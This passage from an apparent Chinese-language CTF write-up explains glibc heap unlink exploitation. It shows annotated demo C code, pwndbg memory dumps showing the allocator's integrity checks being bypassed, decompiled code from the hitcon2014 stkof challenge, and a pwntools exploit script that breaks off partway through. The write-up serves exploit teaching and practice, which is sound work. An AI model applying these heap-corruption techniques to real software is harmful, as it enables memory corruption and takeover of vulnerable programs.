class="string">指针</span> <span class="string">有两个，而</span> <span class="string">在下面都给</span> <span class="string">用成了</span> <span class="string">&amp;chunk1_mem_ptr：</span> <span class="number">0x7fffffffdcb0</span></span><br><span class="line">  <span class="string">fake_chunk-&gt;fd</span> <span class="string">=</span> <span class="string">(struct</span> <span class="string">chunk_structure</span> <span class="string">*)(&amp;fake_chunk</span> <span class="bullet">-</span> <span class="number">3</span><span class="string">);</span> <span class="string">//</span> <span class="string">Ensures</span> <span class="string">P-&gt;fd-&gt;bk</span> <span class="string">==</span> <span class="string">P</span></span><br><span class="line">  <span class="string">fake_chunk-&gt;bk</span> <span class="string">=</span> <span class="string">(struct</span> <span class="string">chunk_structure</span> <span class="string">*)(&amp;fake_chunk</span> <span class="bullet">-</span> <span class="number">2</span><span class="string">);</span> <span class="string">//</span> <span class="string">Ensures</span> <span class="string">P-&gt;bk-&gt;fd</span> <span class="string">==</span> <span class="string">P</span></span><br><span class="line">  <span class="string">/*</span> </span><br><span class="line">  </span><br><span class="line">  <span class="string">"FD-&gt;bk != P || BK-&gt;fd != P"</span> </span><br><span class="line">  </span><br><span class="line">  <span class="string">此时的FD</span> <span class="string">是</span> <span class="string">*(fake_chunk-&gt;fd)</span> <span class="string">即</span> <span class="string">*(fake_chunk+0x10)</span></span><br><span class="line">       <span class="string">BK</span> <span class="string">是</span> <span class="string">*(fake_chunk-&gt;bk)</span> <span class="string">即</span> <span class="string">*(fake_chunk+0x18)</span></span><br><span class="line">       </span><br><span class="line">  <span class="string">如果</span> <span class="string">*(*(fake_chunk+0x10)</span> <span class="string">+0x18)</span> <span class="string">不是fake_chunk</span> <span class="string">或者*(*(fake_chunk+0x18)+0x10)不是fake_chunk</span> <span class="string">,会爆错："corrupted</span> <span class="string">double-linked</span> <span class="string">list"</span></span><br><span class="line"><span class="string">//绕过姿势:</span>  <span class="string">我们使</span>   <span class="string">*(fake_chunk+0x10)是</span>  <span class="string">&amp;fake_chunk-0x18</span> <span class="string">；*(fake_chunk+0x18)是</span> <span class="string">&amp;fake_chunk-0x10</span></span><br><span class="line">            <span class="string">即</span>            <span class="string">FD</span> <span class="string">==</span>  <span class="string">&amp;fake_chunk-0x18</span>                   <span class="string">BK==</span>  <span class="string">&amp;fake_chunk-0x10</span>      </span><br><span class="line">            </span><br><span class="line"><span class="string">p</span> <span class="string">是</span> <span class="string">&amp;fake_chunk</span>   <span class="string">即</span>  <span class="number">0x7fffffffdcb0</span>          <span class="string">//下面的</span> <span class="string">&amp;fake_chunk都</span> <span class="string">用</span>  <span class="string">&amp;chunk1_mem_ptr：</span> <span class="number">0x7fffffffdcb0</span> <span class="string">替换了</span></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">hex(0x7fffffffdcb0-0x18)</span>          </span><br><span class="line"><span class="string">+0000</span> <span class="number">0x7fffffffdc98</span>  </span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">hex(0x7fffffffdcb0-0x10)</span></span><br><span class="line"><span class="string">+0000</span> <span class="number">0x7fffffffdca0</span>  </span><br><span class="line"></span><br><span class="line">                                    <span class="string">/----</span> <span class="string">FD</span> <span class="string">=</span> <span class="string">&amp;chunk1_mem_ptr-0x18</span> </span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">x/10gx</span> <span class="number">0x602010</span>           <span class="string">/</span> </span><br><span class="line"><span class="attr">0x602010:</span>	<span class="number">0x0000000000000000</span>   <span class="string">/</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="attr">0x602020:</span>	<span class="number">0x00007fffffffdc98</span> <span class="string">&lt;-</span>   <span class="number">0x00007fffffffdca0</span>  <span class="string">&lt;-------</span>  <span class="string">BK=&amp;chunk1_mem_ptr-0x10</span>    </span><br><span class="line"><span class="attr">0x602030:</span>	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="attr">0x602040:</span>	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="attr">0x602050:</span>	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="string">我们此时</span> <span class="string">再来看下</span> <span class="string">是否可以通过"corrupted</span> <span class="string">double-linked</span> <span class="string">list"</span> <span class="string">报错检查：</span></span><br><span class="line"><span class="string">"FD-&gt;bk != P || BK-&gt;fd != P"</span>                           <span class="string">这里的P</span> <span class="string">是</span> <span class="string">chunk1</span> <span class="number">0x602010</span></span><br><span class="line"><span class="string">*(*(p+0x10)</span> <span class="string">+0x18)</span> <span class="string">不是chunk1</span> <span class="string">或者*(*(p+0x18)+0x10)不是</span> <span class="string">chunk1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">x/6gx</span> <span class="number">0x602010</span></span><br><span class="line"><span class="attr">0x602010:</span>	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="attr">0x602020:</span>	<span class="number">0x00007fffffffdc98</span><span class="string">--</span>	<span class="number">0x00007fffffffdca0</span><span class="string">----\</span></span><br><span class="line"><span class="attr">0x602030:</span>	<span class="number">0x0000000000000000</span>  <span class="string">\</span>	<span class="number">0x0000000000000000</span>     <span class="string">|</span></span><br><span class="line">                                 <span class="string">\_______</span>                 <span class="string">|</span></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">x/10gx</span> <span class="number">0x00007fffffffdc98</span> <span class="string">&lt;——————|</span>  <span class="string">/—————————————/</span>  </span><br><span class="line"><span class="attr">0x7fffffffdc98:</span>	<span class="number">0x00007ffff7ffe168</span>     <span class="string">/</span> <span class="number">0x0000000000000003</span>      <span class="string">/</span> <span class="string">-----</span>  <span class="string">*(*(p+0x10)</span> <span class="string">+0x18)</span> <span class="string">等于fake_chunk</span> <span class="number">0x602010</span></span><br><span class="line"><span class="attr">0x7fffffffdca8:</span>	<span class="number">0x00000000004006db</span>    <span class="string">/</span> <span class="number">0x0000000000602010</span> <span class="string">&lt;---/</span>  </span><br><span class="line"><span class="attr">0x7fffffffdcb8:</span>	<span class="number">0x00000000006020a0</span>    <span class="string">|</span>	<span class="number">0x0000000000602010</span></span><br><span class="line"><span class="attr">0x7fffffffdcc8:</span>	<span class="number">0x0000000000000000</span>  <span class="string">__|0x00000000004007e0</span></span><br><span class="line"><span class="attr">0x7fffffffdcd8:</span>	<span class="number">0x0000000000400570</span>  <span class="string">|</span>  	<span class="number">0x00007fffffffddd0</span></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">x/10gx</span> <span class="number">0x00007fffffffdca0</span> <span class="string">&lt;————/</span>    <span class="string">_______________________</span> <span class="string">————————</span>   <span class="string">*(*(p+0x18)+0x10)等于</span> <span class="string">fake_chunk</span>  <span class="number">0x602010</span></span><br><span class="line"><span class="attr">0x7fffffffdca0:</span>	<span class="number">0x0000000000000003</span>   <span class="string">/</span>	<span class="number">0x00000000004006db</span></span><br><span class="line"><span class="attr">0x7fffffffdcb0:</span>	<span class="number">0x0000000000602010</span><span class="string">&lt;-/</span>	<span class="number">0x00000000006020a0</span></span><br><span class="line"><span class="attr">0x7fffffffdcc0:</span>	<span class="number">0x0000000000602010</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="attr">0x7fffffffdcd0:</span>	<span class="number">0x00000000004007e0</span>	<span class="number">0x0000000000400570</span></span><br><span class="line"><span class="attr">0x7fffffffdce0:</span>	<span class="number">0x00007fffffffddd0</span>	<span class="number">0x6bb29f2ece5d7700</span></span><br><span class="line"><span class="string">发现成功绕过检查。</span></span><br><span class="line"></span><br><span class="line"> <span class="string">*/</span></span><br><span class="line">  </span><br><span class="line">  <span class="string">//</span> <span class="string">接下来修改chunk2的头以通过所有安全检查</span></span><br><span class="line">  <span class="string">chunk2_hdr</span> <span class="string">=</span> <span class="string">(struct</span> <span class="string">chunk_structure</span> <span class="string">*)(chunk2</span> <span class="bullet">-</span> <span class="number">2</span><span class="string">);</span></span><br><span class="line">  <span class="string">chunk2_hdr-&gt;prev_size</span> <span class="string">=</span> <span class="number">0x80</span><span class="string">;</span>  <span class="string">//</span> <span class="string">chunk1's</span> <span class="string">data</span> <span class="string">region</span> <span class="string">size</span>   <span class="string">伪造chunk的</span> <span class="string">size</span></span><br><span class="line">  <span class="string">chunk2_hdr-&gt;size</span> <span class="string">&amp;=</span> <span class="string">~1;</span>        <span class="string">//</span> <span class="string">Unsetting</span> <span class="string">prev_in_use</span> <span class="string">bit</span>   <span class="string">设置</span> <span class="string">prev_size中的</span> <span class="string">inuse</span> <span class="string">位</span> <span class="string">置为</span> <span class="number">0</span> </span><br><span class="line">  </span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">chunksize(P)</span> <span class="string">!=</span> <span class="string">prev_size</span> <span class="string">(next_chunk(P)),</span> <span class="number">0</span><span class="string">))</span></span><br><span class="line"> <span class="string">如果</span> <span class="string">该chunk的size</span> <span class="string">和</span> <span class="string">下一个chunk</span> <span class="string">的prev_size相等的话。会爆错："corrupted</span> <span class="string">size</span> <span class="string">vs.</span> <span class="string">prev_size"</span>        </span><br><span class="line"> <span class="string">绕过姿势:</span> <span class="string">修改使得</span>  <span class="string">该chunk的size</span> <span class="string">和</span> <span class="string">下一个chunk</span> <span class="string">的prev_size相等</span> <span class="string">即可</span> </span><br><span class="line"> <span class="string">*/</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="string">//</span> <span class="string">Now,</span> <span class="string">when</span> <span class="string">chunk2</span> <span class="string">is</span> <span class="string">freed,</span> <span class="string">attacker's</span> <span class="string">fake</span> <span class="string">chunk</span> <span class="string">is</span> <span class="string">'unlinked'</span></span><br><span class="line">  <span class="string">//</span> <span class="string">This</span> <span class="string">results</span> <span class="string">in</span> <span class="string">chunk1</span> <span class="string">pointer</span> <span class="string">pointing</span> <span class="string">to</span> <span class="string">chunk1</span> <span class="bullet">-</span> <span class="number">3</span></span><br><span class="line">  <span class="string">//</span> <span class="string">i.e.</span> <span class="string">chunk1[3]</span> <span class="string">now</span> <span class="string">contains</span> <span class="string">chunk1</span> <span class="string">itself.</span></span><br><span class="line">  <span class="string">//</span> <span class="string">We</span> <span class="string">then</span> <span class="string">make</span> <span class="string">chunk1</span> <span class="string">point</span> <span class="string">to</span> <span class="string">some</span> <span class="string">victim's</span> <span class="string">data</span></span><br><span class="line">  <span class="string">free(chunk2);</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">                                <span class="string">//</span>     <span class="string">FD</span> <span class="string">=</span> <span class="string">fake_chunk-&gt;fd;</span>     <span class="string">//即</span> <span class="string">FD=fake_chunk+0x10</span>                                                                     </span><br><span class="line">                                <span class="string">//</span>     <span class="string">BK</span> <span class="string">=</span> <span class="string">chunk_chunk-&gt;bk;</span>    <span class="string">//即</span> <span class="string">BK=fake_chunk+0x18</span>    </span><br><span class="line">                               <span class="string">//绕过姿势:</span>  <span class="string">我们使</span>  <span class="string">*(fake_chunk+0x10)是</span>  <span class="string">&amp;fake_chunk-0x18</span> <span class="string">；*(fake_chunk+0x18)是</span> <span class="string">&amp;fake_chunk-0x10</span></span><br><span class="line">                               <span class="string">//</span>        <span class="string">即</span>          <span class="string">FD</span> <span class="string">==</span>  <span class="string">&amp;fake_chunk-0x18</span>             <span class="string">BK==</span>  <span class="string">&amp;fake_chunk-0x10</span>           <span class="string">//&amp;fake_chunk</span>  <span class="string">其实是</span> <span class="meta">&amp;chunk1_mem_ptr</span></span><br><span class="line">                                                                               </span><br><span class="line">                <span class="string">FD-&gt;bk</span> <span class="string">=</span> <span class="string">BK;</span>     <span class="string">//</span> <span class="string">FD+0x18=&amp;fake_chunk-0x10</span>      <span class="string">即*(&amp;fake_chunk-0x18+0x18)=&amp;fake_chunk-0x10</span>                                              </span><br><span class="line">                <span class="string">BK-&gt;fd</span> <span class="string">=</span> <span class="string">FD;</span>     <span class="string">//</span> <span class="string">BK+0x10=&amp;fake_chunk-0x18</span>      <span class="string">即*(&amp;fake_chunk-0x10</span> <span class="string">+0x10)=&amp;fake_chunk-0x18</span>     <span class="string">//关键</span> </span><br><span class="line">                </span><br><span class="line">                            <span class="string">//所以</span> <span class="string">攻击后，</span>       <span class="string">*(&amp;fake_chunk)</span>  <span class="string">=&amp;fake_chunk-0x10</span>  </span><br><span class="line">                            <span class="string">//</span> <span class="string">然后</span> <span class="string">又被重新赋值</span>  <span class="string">*(&amp;fake_chunk)</span>  <span class="string">=&amp;fake_chunk-0x18</span>        <span class="string">//再次</span> <span class="string">强调</span> <span class="string">&amp;fake_chunk其实现在是</span>  <span class="meta">&amp;chunk1_mem_ptr</span></span><br><span class="line">                            <span class="string">//即</span>  <span class="string">unlink</span> <span class="string">后</span> <span class="string">&amp;fake_chunk中的</span> <span class="string">值</span> <span class="string">由</span> <span class="number">0x602010</span> <span class="string">变为了</span>  <span class="string">&amp;fake_chunk-0x18</span> <span class="string">即</span> <span class="number">0x7fffffffdcb0</span><span class="number">-0x18</span> <span class="string">==</span> <span class="number">0x7fffffffdc98</span></span><br><span class="line">                            <span class="string">即</span>  <span class="string">chunk1</span> <span class="string">变为了</span> <span class="number">0x7fffffffdcb0</span><span class="number">-0x18</span> <span class="string">==</span> <span class="number">0x7fffffffdc98</span></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">x/10gx</span> <span class="number">0x7fffffffdc98</span><span class="string">------------------------------------------------|</span></span><br><span class="line"><span class="attr">0x7fffffffdc98:</span>	<span class="number">0x0000000000400570</span>	<span class="number">0x00007fffffffddd0</span>                <span class="string">/</span></span><br><span class="line"><span class="attr">0x7fffffffdca8:</span>	<span class="number">0x000000000040073d</span>	<span class="number">0x00007fffffffdc98</span> <span class="string">&lt;--------------</span></span><br><span class="line"><span class="attr">0x7fffffffdcb8:</span>	<span class="number">0x00000000006020a0</span>	<span class="number">0x0000000000602010</span></span><br><span class="line"><span class="attr">0x7fffffffdcc8:</span>	<span class="number">0x0000000000602090</span>	<span class="number">0x00000000004007e0</span></span><br><span class="line"><span class="attr">0x7fffffffdcd8:</span>	<span class="number">0x0000000000400570</span>	<span class="number">0x00007fffffffddd0</span></span><br><span class="line"></span><br><span class="line">  <span class="string">printf("%p\n",</span> <span class="string">chunk1);</span>       <span class="string">//0x7fffffffdc98</span></span><br><span class="line">  <span class="string">printf("%x\n",</span> <span class="string">chunk1[3]);</span>    <span class="string">//ffffdc98</span>    </span><br><span class="line">  <span class="string">chunk1[3]</span> <span class="string">=</span> <span class="string">(unsigned</span> <span class="string">long</span> <span class="string">long)data;</span></span><br><span class="line">  <span class="string">strcpy(data,</span> <span class="string">"Victim's data"</span><span class="string">);</span></span><br><span class="line">  <span class="string">//</span> <span class="string">Overwrite</span> <span class="string">victim's</span> <span class="string">data</span> <span class="string">using</span> <span class="string">chunk1</span></span><br><span class="line">  <span class="string">chunk1[0]</span> <span class="string">=</span> <span class="string">0x002164656b636168LL;</span>  <span class="string">//hacked!</span></span><br><span class="line">  <span class="string">printf("%s\n",</span> <span class="string">data);</span>   <span class="string">//hacked!</span></span><br><span class="line">  <span class="string">return</span> <span class="number">0</span><span class="string">;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="相关题目：unlink-hitcon2014-stkof"><a href="#相关题目：unlink-hitcon2014-stkof" class="headerlink" title="相关题目：unlink_hitcon2014_stkof"></a>相关题目：unlink_hitcon2014_stkof</h1><p>这题 回显 有些少哦！<br>查看保护：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Arch:</span>     amd64<span class="number">-64</span>-little</span><br><span class="line"><span class="symbol">    RELRO:</span>    Partial RELRO              <span class="comment">//不是 full relro </span></span><br><span class="line"><span class="symbol">    Stack:</span>    Canary found</span><br><span class="line"><span class="symbol">    NX:</span>       NX enabled</span><br><span class="line"><span class="symbol">    PIE:</span>      No PIE (<span class="number">0x400000</span>)          <span class="comment">//no pie</span></span><br></pre></td></tr></table></figure>
+
+<p>程序流程：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="selector-class">.add</span>， 2<span class="selector-class">.edit</span>，3<span class="selector-class">.delete</span>，4<span class="selector-class">.useless</span></span><br></pre></td></tr></table></figure>
+
+<p>1.add：  malloc(size)  size无限制</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">add_400936</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 <span class="built_in">size</span>; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">size</span> = atoll(&amp;s);</span><br><span class="line">  v2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  Structure_array[++i] = v2;         <span class="comment">//++i  下标为 1 处开始 存</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i, <span class="built_in">size</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.edit： 向chunk_mem_addr 指向内容 写入 无限制 长度 内容</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">edit_4009E8</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> index; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  __int64 len; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);                    <span class="comment">// 输入 结构体数组 下标</span></span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  index = atol(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !Structure_array[index] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  len = atoll(&amp;s);</span><br><span class="line">  ptr = Structure_array[index];                 <span class="comment">// 向 Structure_array[index] 数组len 字节 内容</span></span><br><span class="line">  <span class="keyword">for</span> ( i = fread(ptr, <span class="number">1u</span>LL, len, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1u</span>LL, len, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    len -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( len )</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3.delete： 无 UAF</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">delete_400B07</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v1 = atol(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !Structure_array[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="built_in">free</span>(Structure_array[v1]);            <span class="comment">// 内容删除</span></span><br><span class="line">  Structure_array[v1] = <span class="number">0L</span>L;            <span class="comment">//指针清零</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>4.useless：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">sub_400BA9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  index = atol(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !Structure_array[index] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Structure_array[index]) &lt;= <span class="number">3</span> )    <span class="comment">// 判断 Structure_array[index] 中内容长度是否 小于等于 3</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"//TODO"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"..."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h1><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line">def add(size):</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line">    log.success(<span class="string">"Malloc chunk:"</span>+hex(size))</span><br><span class="line"> </span><br><span class="line">def free(index):</span><br><span class="line">    index = str(index)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    log.success(<span class="string">"Free chunk:"</span>+ index)</span><br><span class="line"></span><br><span class="line">def edit(index,payload):</span><br><span class="line">    index = str(index)</span><br><span class="line">    size = str(len(payload))</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line">    log.success(<span class="string">"Edit chunk:"</span> + index)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./stkof"</span>)</span><br><span class="line"><span class="comment">#p = remote("node3.buuoj.cn",25338)</span></span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./stkof"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">globals = 0x0602140   结构体数组 首地址</span><br><span class="line">add(0x80)</span><br><span class="line">add(0x80)</span><br><span class="line">add(0x80)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">FD = globals+16-0x18</span><br><span class="line">BK = globals+16-0x10</span><br><span class="line">payload = p64(0)+p64(0x80)+p64(FD)+p64(BK)</span><br><span class="line">payload = payload.ljust(0x80,'A')</span><br><span class="line">payload += p64(0x80) + p64(0x90)</span><br><span class="line">edit(2, payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(3)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">free_got = elf.got['free']</span><br><span class="line">puts_got = 